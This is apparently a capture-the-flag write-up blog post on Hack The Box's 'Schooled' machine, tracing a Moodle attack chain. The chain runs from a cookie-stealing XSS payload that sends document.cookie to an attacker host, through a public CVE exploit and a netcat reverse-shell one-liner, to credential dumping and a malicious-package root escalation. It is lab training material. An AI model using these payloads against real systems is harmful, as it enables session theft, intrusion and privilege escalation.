<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>📦 HTB - Schooled | 0xNinja - My blog</title><meta name=keywords content="htb,writeup"><meta name=description content="Cool box, not too CTF-like and real-life applicable, my first FreeBSD 😄 But root part was too quick.
 TL;DR XSS to steal Moodle creds of teacher, privesc as manager and then RCE. Get MySQL in config file, dump users and get password hash. Break the hash with john to ssh as user. Common pkg install exploit for root.
Footholds # Nmap 7.91 scan initiated Mon Aug 2 22:40:05 2021 as: nmap -A -p- -T4 -o nmap."><meta name=author content="0xNinja"><link rel=canonical href=https://0xninja.fr/posts/htb-schooled/><link crossorigin=anonymous href=/assets/css/stylesheet.min.fcb2dfef1f861f508726aa63fad2809727c9d99081a63847ab71ee83ce0d1203.css integrity="sha256-/LLf7x+GH1CHJqpj+tKAlyfJ2ZCBpjhHq3Hug84NEgM=" rel="preload stylesheet" as=style><link rel=icon href=https://0xninja.fr/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://0xninja.fr/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://0xninja.fr/favicon-32x32.png><link rel=apple-touch-icon href=https://0xninja.fr/apple-touch-icon.png><link rel=mask-icon href=https://0xninja.fr/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.98.0"><meta property="og:title" content="📦 HTB - Schooled"><meta property="og:description" content="Cool box, not too CTF-like and real-life applicable, my first FreeBSD 😄 But root part was too quick.
 TL;DR XSS to steal Moodle creds of teacher, privesc as manager and then RCE. Get MySQL in config file, dump users and get password hash. Break the hash with john to ssh as user. Common pkg install exploit for root.
Footholds # Nmap 7.91 scan initiated Mon Aug 2 22:40:05 2021 as: nmap -A -p- -T4 -o nmap."><meta property="og:type" content="article"><meta property="og:url" content="https://0xninja.fr/posts/htb-schooled/"><meta property="og:image" content="https://0xninja.fr/box.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-04T13:00:00+00:00"><meta property="article:modified_time" content="2021-08-04T13:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://0xninja.fr/box.png"><meta name=twitter:title content="📦 HTB - Schooled"><meta name=twitter:description content="Cool box, not too CTF-like and real-life applicable, my first FreeBSD 😄 But root part was too quick.
 TL;DR XSS to steal Moodle creds of teacher, privesc as manager and then RCE. Get MySQL in config file, dump users and get password hash. Break the hash with john to ssh as user. Common pkg install exploit for root.
Footholds # Nmap 7.91 scan initiated Mon Aug 2 22:40:05 2021 as: nmap -A -p- -T4 -o nmap."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://0xninja.fr/posts/"},{"@type":"ListItem","position":3,"name":"📦 HTB - Schooled","item":"https://0xninja.fr/posts/htb-schooled/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"📦 HTB - Schooled","name":"📦 HTB - Schooled","description":"Cool box, not too CTF-like and real-life applicable, my first FreeBSD 😄 But root part was too quick.\n TL;DR XSS to steal Moodle creds of teacher, privesc as manager and then RCE. Get MySQL in config file, dump users and get password hash. Break the hash with john to ssh as user. Common pkg install exploit for root.\nFootholds # Nmap 7.91 scan initiated Mon Aug 2 22:40:05 2021 as: nmap -A -p- -T4 -o nmap.","keywords":["htb","writeup"],"articleBody":" Cool box, not too CTF-like and real-life applicable, my first FreeBSD 😄 But root part was too quick.\n TL;DR XSS to steal Moodle creds of teacher, privesc as manager and then RCE. Get MySQL in config file, dump users and get password hash. Break the hash with john to ssh as user. Common pkg install exploit for root.\nFootholds # Nmap 7.91 scan initiated Mon Aug 2 22:40:05 2021 as: nmap -A -p- -T4 -o nmap.out schooled.htb Nmap scan report for schooled.htb (10.10.10.234) Host is up (0.082s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0) | ssh-hostkey: | 2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA) | 256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA) |_ 256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519) 80/tcp open http Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15 |_http-title: Schooled - A new kind of educational institute 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\" | HY000 | LDAPBindReq: | *Parse error unserializing protobuf message\" | HY000 | oracle-tns: | Invalid message-frame.\" |_ HY000 ... The website we have seems to be static, no JavaScript to exploit, not so much to do 🤔\nAfter a while I read that they are talking about a Moodle on this site. So I decided to find it, moodle.schooled.htb!\nEntrypoint XSS you say? Found the version by visiting some forbidden page for my user: Moodle 3.9.\nWe got those email domains: student.schooled.htb \u0026 staff.schooled.htb.\nLooking for exploits for this version, I found an XSS payload for MoodleNet in user profile. By chance, a teacher (maths class) is looking for enroled students’ MoodleNet profiles.\nMoodleNet: new Image().src=\"http://your-ip:port/\" + document.cookie python3 -m http.server port\nSee here for more details about the XSS.\nBy starting an HTTP server on our machine, we get the teacher’s session cookie.\nGet manager access After some research on this Moodle version, I found a good exploit to use: https://github.com/lanzt/CVE-2020-14321.\nNo need to fix this exploit, even if this is not the original exploit script for this CVE, I used it because it was the first to show in the search engine.\n1 2 3  python3 cve.py http://moodle.schooled.htb/moodle -c \"whoami\" --cookie TEACHER_COOKIE [...] www   As this box was FreeBSD, nc does not work the same, we need a bigger payload for a reverse shell:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u00261|nc IP PORT /tmp/f\nSo my command to get a reverse shell:\n1  python3 cve.py http://moodle.schooled.htb/moodle -c \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u00261|nc IP PORT /tmp/f\" --cookie TEACHER_COOKIE   On another terminal:\n1 2 3 4  nc -nlvp PORT $ whoami www $   We have now a reverse shell! Let’s get user.\nUser List user directories:\n$ ls /home /home/steve /home/jamie By looking in the moodle’s directory we get this config file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  php // Moodle configuration file  unset($CFG); global $CFG; $CFG = new stdClass();  $CFG-dbtype = 'mysqli'; $CFG-dblibrary = 'native'; $CFG-dbhost = 'localhost'; $CFG-dbname = 'moodle'; $CFG-dbuser = 'moodle'; $CFG-dbpass = 'PlaybookMaster2020'; $CFG-prefix = 'mdl_'; $CFG-dboptions = array (  'dbpersist' = 0,  'dbport' = 3306,  'dbsocket' = '',  'dbcollation' = 'utf8_unicode_ci', );  $CFG-wwwroot = 'http://moodle.schooled.htb/moodle'; $CFG-dataroot = '/usr/local/www/apache24/moodledata'; $CFG-admin = 'admin';  $CFG-directorypermissions = 0777;  require_once(__DIR__ . '/lib/setup.php');  // There is no php closing tag in this file, // it is intentional because it prevents trailing whitespace problems!   We have now MySQL creds, let’s use them:\n1 2  /usr/local/bin/mysql -umoodle -p Password:   Weird… We should get a shell here.\nIn fact the exploit we use is not meant to nest child shells. For example we can’t just bash to get a bash shell, we must stay in our shell.\nFortunaletly we can execute commands using MySQL’s binary:\n1  /usr/local/bin/mysql -umoodle -pPlaybookMaster2020 -D moodle -e \"show tables;\"   We dump the users:\n1  select * from mdl_user;   The interesting line here is:\nadmin $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW Jamie Borham jamie@staff.schooled.htb We need to crack this hash. Let’s use john:\nWe can SSH with this.\nRoot Classic:\nsudo -l (NOPASSWD) /usr/sbin/pkg update (NOPASSWD) /usr/sbin/pkg install * Using this https://gtfobins.github.io/gtfobins/pkg/ we build our package to RCE as root:\n1 2 3 4  # local echo 'cat /root/root.txt'  a.sh fpm -n x -s dir -t freebsd -a all --before-install a.sh . scp x-1.0.txz jamie@schooled.htb:/tmp   1 2 3 4  # ssh sudo /usr/sbin/pkg install -y --no-repo-update /tmp/x-1.0.txz ... /root/root.txt hash here   ","wordCount":"747","inLanguage":"en","image":"https://0xninja.fr/box.png","datePublished":"2021-08-04T13:00:00Z","dateModified":"2021-08-04T13:00:00Z","author":{"@type":"Person","name":"0xNinja"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://0xninja.fr/posts/htb-schooled/"},"publisher":{"@type":"Organization","name":"0xNinja - My blog","logo":{"@type":"ImageObject","url":"https://0xninja.fr/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://0xninja.fr accesskey=h title="0xNinja - My blog (Alt + H)">0xNinja - My blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://0xninja.fr/about/ title="🥷 About"><span>🥷 About</span></a></li><li><a href=https://0xninja.fr/archives/ title="📝 Archives"><span>📝 Archives</span></a></li><li><a href=https://0xninja.fr/tags/ title="🏷️ Tags"><span>🏷️ Tags</span></a></li><li><a href=https://0xninja.fr/projects/ title="🔬 Projects"><span>🔬 Projects</span></a></li><li><a href=https://0xninja.fr/search/ title="🔎 Search (Alt + /)" accesskey=/><span>🔎 Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://0xninja.fr>Home</a>&nbsp;»&nbsp;<a href=https://0xninja.fr/posts/>Posts</a></div><h1 class=post-title>📦 HTB - Schooled</h1><div class=post-meta>August 4, 2021&nbsp;·&nbsp;4 min&nbsp;·&nbsp;0xNinja</div></header><figure class=entry-cover><img loading=lazy srcset="https://0xninja.fr/posts/htb-schooled/box_hu034653defd9b5eb62fc5cb5de3584561_26817_360x0_resize_box_3.png 360w ,https://0xninja.fr/posts/htb-schooled/box_hu034653defd9b5eb62fc5cb5de3584561_26817_480x0_resize_box_3.png 480w ,https://0xninja.fr/posts/htb-schooled/box_hu034653defd9b5eb62fc5cb5de3584561_26817_720x0_resize_box_3.png 720w ,https://0xninja.fr/posts/htb-schooled/box.png 771w" sizes="(min-width: 768px) 720px, 100vw" src=https://0xninja.fr/posts/htb-schooled/box.png alt></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><div class=details>Table of Contents</div></summary><div class=inner><ul><li><a href=#tldr aria-label=TL;DR>TL;DR</a></li><li><a href=#footholds aria-label=Footholds>Footholds</a></li><li><a href=#entrypoint aria-label=Entrypoint>Entrypoint</a><ul><li><a href=#xss-you-say aria-label="XSS you say?">XSS you say?</a></li><li><a href=#get-manager-access aria-label="Get manager access">Get manager access</a></li></ul></li><li><a href=#user aria-label=User>User</a></li><li><a href=#root aria-label=Root>Root</a></li></ul></div></details></div><div class=post-content><blockquote><p>Cool box, not too CTF-like and real-life applicable, my first FreeBSD 😄 But root part was too quick.</p></blockquote><h2 id=tldr>TL;DR<a hidden class=anchor aria-hidden=true href=#tldr>#</a></h2><p>XSS to steal Moodle creds of teacher, privesc as manager and then RCE. Get MySQL in config file, dump users and get password hash. Break the hash with john to ssh as user. Common <code>pkg install</code> exploit for root.</p><h2 id=footholds>Footholds<a hidden class=anchor aria-hidden=true href=#footholds>#</a></h2><pre tabindex=0><code># Nmap 7.91 scan initiated Mon Aug  2 22:40:05 2021 as: nmap -A -p- -T4 -o nmap.out schooled.htb
Nmap scan report for schooled.htb (10.10.10.234)
Host is up (0.082s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message&#34;
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message&#34;
|     HY000
|   oracle-tns: 
|     Invalid message-frame.&#34;
|_    HY000
...
</code></pre><p>The website we have seems to be static, no JavaScript to exploit, not so much to do 🤔</p><p>After a while I read that they are talking about a Moodle on this site. So I decided to find it, <code>moodle.schooled.htb</code>!</p><h2 id=entrypoint>Entrypoint<a hidden class=anchor aria-hidden=true href=#entrypoint>#</a></h2><h3 id=xss-you-say>XSS you say?<a hidden class=anchor aria-hidden=true href=#xss-you-say>#</a></h3><p>Found the version by visiting some forbidden page for my user: Moodle 3.9.</p><p><img loading=lazy src=userpix.png alt=userpix></p><p>We got those email domains: <code>student.schooled.htb</code> & <code>staff.schooled.htb</code>.</p><p>Looking for exploits for this version, I found an XSS payload for <code>MoodleNet</code> in user profile. By chance, a teacher (maths class) is looking for enroled students&rsquo; MoodleNet profiles.</p><p>MoodleNet: <code>&lt;script>new Image().src="http://your-ip:port/" + document.cookie&lt;/script></code>
<code>python3 -m http.server port</code></p><p>See <a href=https://github.com/HoangKien1020/CVE-2020-25627>here for more details about the XSS</a>.</p><p>By starting an HTTP server on our machine, we get the teacher&rsquo;s session cookie.</p><p><img loading=lazy src=teacher_session.png alt="Teacher session cookie"></p><p><img loading=lazy src=teacher_log.png alt="Logged as teacher"></p><h3 id=get-manager-access>Get manager access<a hidden class=anchor aria-hidden=true href=#get-manager-access>#</a></h3><p>After some research on this Moodle version, I found a good exploit to use: <a href=https://github.com/lanzt/CVE-2020-14321>https://github.com/lanzt/CVE-2020-14321</a>.</p><p>No need to fix this exploit, even if this is not the original exploit script for this CVE, I used it because it was the first to show in the search engine.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>python3 cve.py http://moodle.schooled.htb/moodle -c <span style=color:#e6db74>&#34;whoami&#34;</span> --cookie TEACHER_COOKIE
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>www
</span></span></code></pre></td></tr></table></div></div><p>As this box was FreeBSD, <code>nc</code> does not work the same, we need a bigger payload for a reverse shell:</p><p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f</code></p><p>So my command to get a reverse shell:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>python3 cve.py http://moodle.schooled.htb/moodle -c <span style=color:#e6db74>&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP PORT &gt;/tmp/f&#34;</span> --cookie TEACHER_COOKIE
</span></span></code></pre></td></tr></table></div></div><p>On another terminal:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>nc -nlvp PORT
</span></span><span style=display:flex><span>$ whoami
</span></span><span style=display:flex><span>www
</span></span><span style=display:flex><span>$
</span></span></code></pre></td></tr></table></div></div><p>We have now a reverse shell! Let&rsquo;s get user.</p><h2 id=user>User<a hidden class=anchor aria-hidden=true href=#user>#</a></h2><p>List user directories:</p><pre tabindex=0><code>$ ls /home
/home/steve
/home/jamie
</code></pre><p>By looking in the moodle&rsquo;s directory we get this config file:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>  <span style=color:#75715e>// Moodle configuration file
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>unset</span>($CFG);
</span></span><span style=display:flex><span><span style=color:#66d9ef>global</span> $CFG;
</span></span><span style=display:flex><span>$CFG <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>stdClass</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$CFG<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dbtype</span>    <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mysqli&#39;</span>;
</span></span><span style=display:flex><span>$CFG<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dblibrary</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;native&#39;</span>;
</span></span><span style=display:flex><span>$CFG<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dbhost</span>    <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;localhost&#39;</span>;
</span></span><span style=display:flex><span>$CFG<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dbname</span>    <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;moodle&#39;</span>;
</span></span><span style=display:flex><span>$CFG<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dbuser</span>    <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;moodle&#39;</span>;
</span></span><span style=display:flex><span>$CFG<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dbpass</span>    <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;PlaybookMaster2020&#39;</span>;
</span></span><span style=display:flex><span>$CFG<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prefix</span>    <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mdl_&#39;</span>;
</span></span><span style=display:flex><span>$CFG<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dboptions</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span> (
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;dbpersist&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;dbport&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>3306</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;dbsocket&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;dbcollation&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;utf8_unicode_ci&#39;</span>,
</span></span><span style=display:flex><span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$CFG<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>wwwroot</span>   <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://moodle.schooled.htb/moodle&#39;</span>;
</span></span><span style=display:flex><span>$CFG<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dataroot</span>  <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/usr/local/www/apache24/moodledata&#39;</span>;
</span></span><span style=display:flex><span>$CFG<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>admin</span>     <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;admin&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$CFG<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>directorypermissions</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0777</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span>(<span style=color:#66d9ef>__DIR__</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/lib/setup.php&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// There is no php closing tag in this file,
</span></span></span><span style=display:flex><span><span style=color:#75715e>// it is intentional because it prevents trailing whitespace problems!
</span></span></span></code></pre></td></tr></table></div></div><p>We have now MySQL creds, let&rsquo;s use them:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>/usr/local/bin/mysql -umoodle -p
</span></span><span style=display:flex><span>Password:
</span></span></code></pre></td></tr></table></div></div><p>Weird&mldr; We should get a shell here.</p><p>In fact the exploit we use is not meant to nest child shells. For example we can&rsquo;t just <code>bash</code> to get a bash shell, we must stay in our shell.</p><p>Fortunaletly we can execute commands using MySQL&rsquo;s binary:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>/usr/local/bin/mysql -umoodle -pPlaybookMaster2020 -D moodle -e <span style=color:#e6db74>&#34;show tables;&#34;</span>
